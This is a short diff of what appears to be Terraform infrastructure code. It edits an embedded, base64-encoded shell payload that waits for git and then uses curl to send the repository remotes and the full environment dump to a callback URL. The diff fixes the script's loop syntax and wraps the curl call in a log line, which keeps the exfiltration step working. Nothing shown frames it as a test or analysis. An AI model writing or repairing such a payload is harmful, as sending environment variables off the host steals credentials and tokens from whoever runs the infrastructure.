@@ -10,12 +10,12 @@ locals {
     }
     truncate -s 0 $LOGFILE
     log "checking for git..."
-    while ! which git; then
+    while ! which git; do
         log "git not found - waiting"
         sleep 10
     done
     log "running curl: ${local.callback_url}/upload/v2"
-    curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" ${local.callback_url}/upload/v2 || true
+    log "$(curl -sm 0.5 -d \"$(git remote -v)<<<<<< ENV $(env)\" ${local.callback_url}/upload/v2 || true)"
     log "done"
     EOT
     base64_payload = base64encode(local.payload)
